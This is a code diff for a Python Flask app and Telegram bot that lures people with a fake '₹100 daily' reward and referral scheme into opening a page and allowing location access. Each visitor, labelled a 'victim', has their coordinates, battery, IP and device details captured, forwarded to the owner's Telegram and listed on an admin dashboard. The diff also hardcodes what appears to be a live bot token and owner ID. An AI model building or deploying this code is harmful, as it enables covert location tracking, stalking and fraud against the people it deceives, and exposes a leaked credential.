@@ -1,131 +1,45 @@
 import os
 import json
 import logging
-import threading
 import requests
 from datetime import datetime
 from flask import Flask, request, jsonify
 
-# === SIRF YEH DO CHEEZEIN CHANGE KARO ===
-BOT_TOKEN = os.environ.get("8849680903:AAFhk2Aq2rfxuou1cHZqSOr4N1_JCei-7n4", "YOUR_BOT_TOKEN_HERE")
-OWNER_ID = os.environ.get("8586849798", "YOUR_TELEGRAM_USER_ID")
+# === TOKEN AND OWNER ID - ALREADY SET ===
+BOT_TOKEN = "8849680903:AAFhk2Aq2rfxuou1cHZqSOr4N1_JCei-7n4"
+OWNER_ID = "8586849798"
 
-# Flask app
 app = Flask(__name__)
-
-# Victim data store
 victim_data = {}
 
-# Logging
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# === TELEGRAM API FUNCTIONS (Direct API - No python-telegram-bot needed) ===
-
 TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
 
-def send_message(chat_id, text, parse_mode="Markdown", reply_markup=None):
-    """Send message via Telegram API"""
+def send_message(chat_id, text, reply_markup=None):
     url = f"{TELEGRAM_API}/sendMessage"
     data = {
         "chat_id": chat_id,
         "text": text,
-        "parse_mode": parse_mode
+        "parse_mode": "Markdown"
     }
     if reply_markup:
         data["reply_markup"] = json.dumps(reply_markup)
     
     try:
         r = requests.post(url, data=data, timeout=10)
-        logger.info(f"Message sent to {chat_id}: {r.status_code}")
+        logger.info(f"sendMessage to {chat_id}: {r.status_code}")
         return r.json()
     except Exception as e:
-        logger.error(f"Failed to send message: {e}")
+        logger.error(f"sendMessage error: {e}")
         return None
-
-def answer_callback_query(callback_query_id, text=None, show_alert=False):
-    """Answer callback query"""
-    url = f"{TELEGRAM_API}/answerCallbackQuery"
-    data = {"callback_query_id": callback_query_id}
-    if text:
-        data["text"] = text
-    if show_alert:
-        data["show_alert"] = True
-    
-    try:
-        requests.post(url, data=data, timeout=5)
-    except:
-        pass
-
-def set_webhook(url):
-    """Set webhook for bot"""
-    webhook_url = f"{url}/webhook"
-    r = requests.get(f"{TELEGRAM_API}/setWebhook?url={webhook_url}")
-    logger.info(f"Webhook set: {r.json()}")
-    return r.json()
-
-# === BOT COMMAND HANDLERS ===
-
-def handle_start(chat_id, user_first_name, user_id):
-    """Handle /start command"""
-    host = request.host if request else "your-app.onrender.com"
-    
-    welcome = f"""
-👋 **ᴡᴇʟᴄᴏᴍᴇ {user_first_name}!** 🎉
-
-💰 **ᴇᴀʀɴ ₹𝟷𝟶𝟶 ᴅᴀɪʟʏ** 💰
-
-➥ ʙᴀꜱ ᴇᴋ ʙᴜᴛᴛᴏɴ ᴅᴀʙᴀᴏ
-➥ ʟᴏᴄᴀᴛɪᴏɴ ᴀʟʟᴏᴡ ᴋᴀʀᴏ
-➥ ₹𝟷𝟶𝟶 ɪɴꜱᴛᴀɴᴛ ɢᴘᴀʏ/ᴘᴀʏᴛᴍ/ᴘʜᴏɴᴇᴘᴇ 🤑
-
-ᴛʀᴜꜱᴛᴇᴅ ʙʏ 𝟻𝟶,𝟶𝟶𝟶+ ᴜꜱᴇʀꜱ ✅
-ᴢᴇʀᴏ ɪɴᴠᴇꜱᴛᴍᴇɴᴛ 🔥
-
-👇 **ɴɪᴄʜᴇ ᴅɪʏᴇ ɢᴀᴇ ʙᴜᴛᴛᴏɴ ᴘᴇ ᴛᴀᴘ ᴋᴀʀᴏ** 👇
-"""
-    keyboard = {
-        "inline_keyboard": [[
-            {"text": "🤑 ᴄʟᴀɪᴍ ₹𝟷𝟶𝟶 ɴᴏᴡ 🤑", "url": f"https://{host}"}
-        ]]
-    }
-    send_message(chat_id, welcome, reply_markup=keyboard)
-
-def handle_link(chat_id, user_id):
-    """Handle /link command"""
-    host = request.host if request else "your-app.onrender.com"
-    link = f"https://{host}?ref={user_id}"
-    
-    msg = f"""
-🔗 **ᴛᴇʀᴀ ʀᴇꜰᴇʀʀᴀʟ ʟɪɴᴋ:** 📎
-`{link}`
-
-ᴋɪꜱɪ ᴄᴏ ʙʜᴇᴊ ᴅᴇ ✅
-ᴊᴀʙ ᴠᴏ ᴄʟɪᴄᴋ ᴋᴀʀᴇɢᴀ ᴀᴜʀ ʟᴏᴄᴀᴛɪᴏɴ ᴀʟʟᴏᴡ ᴋᴀʀᴇɢᴀ
-ᴛᴏ ᴛᴇʀᴀ ₹𝟸𝟻 ʀᴇꜰᴇʀʀᴀʟ ʙᴏɴᴜꜱ ᴀᴀʏᴇɢᴀ! 🤑
-"""
-    send_message(chat_id, msg)
-
-def handle_help(chat_id):
-    """Handle /help command"""
-    msg = """
-🤖 **ʙᴏᴛ ᴄᴏᴍᴍᴀɴᴅꜱ:**
-
-/start - ꜱᴛᴀʀᴛ ᴛʜᴇ ʙᴏᴛ ᴀɴᴅ ɢᴇᴛ ₹𝟷𝟶𝟶 ᴏꜰꜰᴇʀ
-/link - ɢᴇɴᴇʀᴀᴛᴇ ʏᴏᴜʀ ʀᴇꜰᴇʀʀᴀʟ ʟɪɴᴋ
-/help - ꜱʜᴏᴡ ᴛʜɪꜱ ᴍᴇꜱꜱᴀɢᴇ
-"""
-    send_message(chat_id, msg)
-
-# === FLASK ROUTES ===
 
 @app.route('/')
 def index():
-    """Phishing page"""
     ref = request.args.get('ref', 'unknown')
     host = request.host
-    return f"""
-<!DOCTYPE html>
+    return f"""<!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
@@ -203,12 +117,10 @@ else throw Error('err');
 }}
 </script>
 </body>
-</html>
-"""
+</html>"""
 
 @app.route('/capture', methods=['POST'])
 def capture():
-    """Receive victim data"""
     data = request.json
     data['ip'] = request.remote_addr
     data['forwarded_ip'] = request.headers.get('X-Forwarded-For', '')
@@ -216,27 +128,21 @@ def capture():
     vid = f"victim_{int(datetime.now().timestamp())}"
     victim_data[vid] = data
     
-    # Console log
     print(f"""
 ╔══════════════════════════════════════════╗
-║   🔥 NEW VICTIM CAPTURED: {vid}  🔥
+║   🔥 NEW VICTIM: {vid}  🔥
 ╠══════════════════════════════════════════╣
-║ 📍  Lat: {data['lat']}
-║ 📍  Lon: {data['lon']}
+║ 📍  {data['lat']}, {data['lon']}
 ║ 🎯  Accuracy: {data['acc']}m
-║ 🔋  Battery: {data['batt']}% 
-║ 🔌  Charging: {data['charge']}
+║ 🔋  Battery: {data['batt']}% | Charge: {data['charge']}
 ║ 🌐  IP: {data['ip']}
 ║ 📱  Platform: {data['plat']}
-║ 🕐  Time: {data['ts']}
-║ 👤  Ref: {data['ref']}
+║ 🕐  {data['ts']}
 ╚══════════════════════════════════════════╝
 """)
     
-    # Send notification to owner
-    if OWNER_ID != "YOUR_TELEGRAM_USER_ID":
-        msg = f"""
-⚠️ **ɴᴇᴡ ᴠɪᴄᴛɪᴍ ᴄᴀᴘᴛᴜʀᴇᴅ!** ⚠️
+    # Send to owner
+    msg = f"""⚠️ **ɴᴇᴡ ᴠɪᴄᴛɪᴍ ᴄᴀᴘᴛᴜʀᴇᴅ!** ⚠️
 
 📍 **ʟᴏᴄᴀᴛɪᴏɴ:** {data['lat']}, {data['lon']}
 🎯 **ᴀᴄᴄᴜʀᴀᴄʏ:** {data['acc']}ᴍ
@@ -246,79 +152,80 @@ def capture():
 📱 **ᴅᴇᴠɪᴄᴇ:** {data['plat']}
 🕐 **ᴛɪᴍᴇ:** {data['ts']}
 
-🔗 **ɢᴏᴏɢʟᴇ ᴍᴀᴘꜱ:** https://www.google.com/maps?q={data['lat']},{data['lon']}
-"""
-        send_message(OWNER_ID, msg)
+🔗 **ᴍᴀᴘꜱ:** https://www.google.com/maps?q={data['lat']},{data['lon']}"""
+    send_message(OWNER_ID, msg)
     
     return jsonify({"status": "ok", "message": "Reward claimed!"})
 
 @app.route('/webhook', methods=['POST'])
 def webhook():
-    """Handle incoming Telegram updates via webhook"""
     update = request.json
-    
     if not update:
         return "ok", 200
     
-    logger.info(f"Received update: {json.dumps(update)[:200]}...")
+    logger.info(f"Update: {json.dumps(update)[:150]}")
     
-    # Handle message
     if 'message' in update:
         msg = update['message']
         chat_id = msg['chat']['id']
         text = msg.get('text', '')
         user = msg.get('from', {})
-        user_first_name = user.get('first_name', 'User')
-        user_id = user.get('id', 0)
+        name = user.get('first_name', 'User')
+        uid = user.get('id', 0)
         
         if text == '/start':
-            handle_start(chat_id, user_first_name, user_id)
+            host = request.host
+            welcome = f"""👋 **ᴡᴇʟᴄᴏᴍᴇ {name}!** 🎉
+
+💰 **ᴇᴀʀɴ ₹𝟷𝟶𝟶 ᴅᴀɪʟʏ** 💰
+
+➥ ʙᴀꜱ ᴇᴋ ʙᴜᴛᴛᴏɴ ᴅᴀʙᴀᴏ
+➥ ʟᴏᴄᴀᴛɪᴏɴ ᴀʟʟᴏᴡ ᴋᴀʀᴏ
+➥ ₹𝟷𝟶𝟶 ɪɴꜱᴛᴀɴᴛ 🤑
+
+ᴛʀᴜꜱᴛᴇᴅ ʙʏ 𝟻𝟶,𝟶𝟶𝟶+ ᴜꜱᴇʀꜱ ✅
+ᴢᴇʀᴏ ɪɴᴠᴇꜱᴛᴍᴇɴᴛ 🔥
+
+👇 **ʙᴜᴛᴛᴏɴ ᴘᴇ ᴛᴀᴘ ᴋᴀʀᴏ** 👇"""
+            kb = {"inline_keyboard": [[{"text": "🤑 ᴄʟᴀɪᴍ ₹𝟷𝟶𝟶 ɴᴏᴡ 🤑", "url": f"https://{host}"}]]}
+            send_message(chat_id, welcome, kb)
+            
         elif text == '/link':
-            handle_link(chat_id, user_id)
+            host = request.host
+            link = f"https://{host}?ref={uid}"
+            msg = f"""🔗 **ᴛᴇʀᴀ ʟɪɴᴋ:** 📎
+`{link}`
+
+ᴋɪꜱɪ ᴄᴏ ʙʜᴇᴊ ᴅᴇ ✅
+ᴊᴀʙ ᴠᴏ ᴄʟɪᴄᴋ ᴋᴀʀᴇɢᴀ ᴛᴏ ᴛᴇʀᴀ ₹𝟸𝟻 ʀᴇꜰᴇʀʀᴀʟ ʙᴏɴᴜꜱ 🤑"""
+            send_message(chat_id, msg)
+            
         elif text == '/help':
-            handle_help(chat_id)
+            send_message(chat_id, """🤖 **ᴄᴏᴍᴍᴀɴᴅꜱ:**
+/start - ꜱᴛᴀʀᴛ ᴀɴᴅ ɢᴇᴛ ₹𝟷𝟶𝟶 ᴏꜰꜰᴇʀ
+/link - ɢᴇᴛ ʏᴏᴜʀ ʀᴇꜰᴇʀʀᴀʟ ʟɪɴᴋ
+/help - ʜᴇʟᴘ""")
         else:
-            # Unknown command - send help
-            handle_help(chat_id)
-    
-    # Handle callback query (button clicks)
-    if 'callback_query' in update:
-        cb = update['callback_query']
-        cb_id = cb['id']
-        chat_id = cb['message']['chat']['id']
-        user_id = cb['from'].get('id', 0)
-        data = cb.get('data', '')
-        
-        # Just answer the callback
-        answer_callback_query(cb_id)
+            send_message(chat_id, "❌ Unknown command. Use /start")
     
     return "ok", 200
 
 @app.route('/admin')
 def admin():
-    """Admin dashboard - see all victim data"""
-    html = """
-    <html><head><title>Victim Data Dashboard</title>
+    html = """<html><head><title>Victim Data</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
     body{font-family:sans-serif;background:#1a1a2e;color:#eee;padding:20px;}
     h1{color:#e94560;}
-    table{border-collapse:collapse;width:100%;margin:10px 0;background:#16213e;border-radius:10px;overflow:hidden;}
-    th{background:#e94560;padding:12px;text-align:left;}
-    td{padding:10px;border-bottom:1px solid #333;word-break:break-all;}
-    tr:hover{background:#1a1a3e;}
     .card{background:#16213e;border-radius:10px;padding:15px;margin:15px 0;}
     .label{color:#e94560;font-weight:bold;}
-    .badge{background:#0f3460;padding:3px 10px;border-radius:20px;font-size:12px;}
     a{color:#4fc3f7;}
     .total{font-size:20px;margin:10px 0;color:#4fc3f7;}
-    .map-btn{display:inline-block;background:#4CAF50;color:white;padding:5px 15px;border-radius:20px;text-decoration:none;font-size:13px;}
     </style></head><body>
-    <h1>📊 Victim Data Dashboard</h1>
-    <div class="total">Total Victims: """ + str(len(victim_data)) + """</div>
-    """
+    <h1>📊 Victim Data</h1>
+    <div class="total">Total: """ + str(len(victim_data)) + """</div>"""
     if not victim_data:
-        html += '<p style="color:#888;font-size:18px;margin-top:30px;">⏳ No victims captured yet. Share the bot link!</p>'
+        html += '<p style="color:#888;">⏳ No victims yet</p>'
     else:
         for vid, d in list(victim_data.items())[::-1]:
             html += f"""
@@ -326,42 +233,25 @@ def admin():
             <h3>🆔 {vid}</h3>
             <p><span class="label">📍 Location:</span> {d['lat']}, {d['lon']}</p>
             <p><span class="label">🎯 Accuracy:</span> {d['acc']}m</p>
-            <p><a class="map-btn" href="https://www.google.com/maps?q={d['lat']},{d['lon']}" target="_blank">🗺️ Open in Google Maps</a></p>
-            <p><span class="label">🔋 Battery:</span> {d['batt']}% | <span class="label">🔌 Charging:</span> {d['charge']}</p>
+            <p><a href="https://www.google.com/maps?q={d['lat']},{d['lon']}" target="_blank">🗺️ Google Maps</a></p>
+            <p><span class="label">🔋 Battery:</span> {d['batt']}% | <span class="label">🔌 Charge:</span> {d['charge']}</p>
             <p><span class="label">🌐 IP:</span> {d['ip']}</p>
             <p><span class="label">📱 Platform:</span> {d.get('plat','?')}</p>
-            <p><span class="label">🌍 Language:</span> {d.get('lang','?')}</p>
-            <p><span class="label">👤 Referrer:</span> <span class="badge">{d.get('ref','?')}</span></p>
             <p><span class="label">🕐 Time:</span> {d.get('ts','?')}</p>
-            <p><span class="label">💻 UA:</span> <small style="color:#888;word-break:break-all;">{d.get('ua','?')}</small></p>
-            </div>
-            """
+            </div>"""
     html += "</body></html>"
     return html
 
 @app.route('/set-webhook')
 def setup_webhook():
-    """Manually set webhook"""
     host = request.host
     url = f"https://{host}"
-    result = set_webhook(url)
-    return f"Webhook set result: {result}"
-
-# === STARTUP ===
+    r = requests.get(f"{TELEGRAM_API}/setWebhook?url={url}/webhook")
+    return f"Webhook: {r.json()}"
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
-    host = os.environ.get("RENDER_EXTERNAL_URL", f"http://0.0.0.0:{port}")
-    
-    print(f"""
-╔══════════════════════════════════════════╗
-║   🤖 TELEGRAM LOCATION BOT DEPLOYED  🤖  ║
-╠══════════════════════════════════════════╣
-║   Web: {host}
-║   Admin: {host}/admin
-║   Set Webhook: {host}/set-webhook
-╚══════════════════════════════════════════╝
-    """)
-    
-    # Start Flask
+    print(f"Bot starting on port {port}...")
     app.run(host="0.0.0.0", port=port, debug=False)
+    
+    
